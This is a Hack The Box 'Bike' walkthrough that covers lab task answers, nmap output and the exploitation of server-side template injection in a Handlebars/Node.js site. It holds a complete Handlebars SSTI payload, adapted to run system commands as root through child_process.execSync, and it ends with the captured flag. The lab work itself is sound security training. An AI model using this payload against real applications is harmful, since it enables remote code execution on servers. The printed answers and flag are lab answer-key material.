# Bike
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Bike 
* Topic: SMB, Javascript, SSTI
* Difficulty: Very easy
* Date: 16-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high. 
 - **22,80**
2. What software is running the service listening on the http/web port identified in the first question? 
- **node.js**
3. What is the name of the Web Framework according to Wappalyzer? 
- **express**
4. What is the name of the vulnerability we test for by submitting {{7*7}}?
- **Server Side Template Injection**
5. What is the templating engine being used within Node.JS?
- **Handlebars**
6. What is the name of the BurpSuite tab used to encode text? 
- **decoder**
7. In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use? 
- **URL**
8. When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error? 
- **require**
9. What variable is the name of the top-level scope in Node.JS? 
- **Global**
10. By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user? 
 - **root**

---
## Flag:
Nmap scan:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV 10.129.97.64 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 18:19 EDT
Nmap scan report for 10.129.97.64
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

It's hosting ssh on port 22 and a web interface on port 80. Upon inspection, the web page is under construction. We can input an e-mail address and get updates on its progress. If we do so, we get a message back containing the e-mail we gave as input.

![](./attachments/Pasted%20image%2020220416012808.png)

This might be vulnerable to multiple kinds of attack.

We can try to find out more about the site using the browser extension called Wappalyzer.

![](./attachments/Pasted%20image%2020220416160703.png)

Like nmap, this extension confirms that the site is written in Node.js and that the web framework is Express.  

Since Node.js (and Python) websites often use template engines to display information to their users, they are also often vulnerable to SSTI attacks. Therefore, we will try to explore this path further.

[HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) provides some great information on how to exploit multiple different types of template engines.

Now we need to find out if the site is indeed vulnerable. We would also like to find out which template engine is being used so we in the end can craft a payload for it.

According to this image from the article, we can follow the tree structure to try and find out what engine is running.

![](./attachments/Pasted%20image%2020220416170535.png)

First, we will submit `${7*7}`. It doesn't get executed though and is just reflected back at us like the e-mail address.

![](./attachments/Pasted%20image%2020220416171325.png)

Therefore, `{{7*7}}` is next in line. When submitted, we get an error. 

This is not bad at all, though. Clearly, our input got interpreted instead of just being reflected back a us. This means that we just confirmed that the site *is* vulnerable to SST injections.

Furthermore, the error message provides us with some valuable information. Handlebars are being used as the Template Engine, and it is running as root.

![](./attachments/Pasted%20image%2020220416014612.png)

We need to try some different inputs, Burp Suite's repeater function can make this a lot easier.

Right click anywhere in the background of the intercepted request, then repeater.

![](./attachments/Pasted%20image%2020220416174154.png)

In the repeater tab we can now see the requests, if we click send we can see the server response on the right side of the window.

At the bottom of our request, we can see the input we made, although a bit distorted due to URL encoding.

![](./attachments/Pasted%20image%2020220416174858.png)

In the [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) article there is a Handlebars section, in it, we find a payload.

```
{{#with "s" as |string|}}
	{{#with "e"}}
		{{#with split as |conslist|}}
			{{this.pop}}
			{{this.push (lookup string.sub "constructor")}}
			{{this.pop}}
			{{#with string.split as |codelist|}}
				{{this.pop}}
				{{this.push "return require('child_process').exec('whoami');"}}
				{{this.pop}}
				{{#each conslist}}
					{{#with (string.sub.apply 0 codelist)}}
						{{this}}
					{{/with}}
				{{/each}}
			{{/with}}
		{{/with}}
	{{/with}}
{{/with}}
```

This looks very complicated, but we will only really be focusing on the following line, the rest is just 'delivery' code.

`{{this.push "return require('child_process').exec('whoami');"}}`

It tries to execute the `whoami` command on the server.

Before sending the payload, though, we need to encode it in URL encoding. With Burp's decode feature, can do this in seconds.

![](./attachments/Pasted%20image%2020220416180907.png)

Paste the URL encoding into the request.

![](./attachments/Pasted%20image%2020220416181027.png)

And send it.

We receive an error message back.

![](./attachments/Pasted%20image%2020220416183034.png)

Require is not defined. It means that we cannot use require in our injection. Thankfully, according to the [documentation](https://nodejs.org/api/globals.html) on Node.js there might be a `process` object available. 

We need to edit our line to:

`{{this.push "return process;"}}`

Then re-encode and send like before.

This time we don't get an error.

![](./attachments/Pasted%20image%2020220416184411.png)

Great, the `[object process]` has been returned. This is handling the current Node.js process. We can try to load a module through it, possibly allowing us to use require again. We will utilize the `'child_process'` module since it has access to executing system commands. We will edit our line to:

`{{this.push "return process.mainModule.require('child_process');"}}`

![](./attachments/Pasted%20image%2020220416232954.png)

It worked, the command executed without errors. 

Now we can try and execute an actual command like `whoami` by changing the line to:

`{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}`

![](./attachments/Pasted%20image%2020220416233853.png)

That's it! We got root. Now we just need to rinse and repeat for every command we want to execute in order to find the flag.

`{{this.push "return process.mainModule.require('child_process').execSync('cd .. ; cat flag.txt');"}}`

Did it. 

![](./attachments/Pasted%20image%2020220416235105.png)


**Flag:** `6b258d726d287462d60c103d0142a81c`

---
**Tags:** [[Hack The Box]]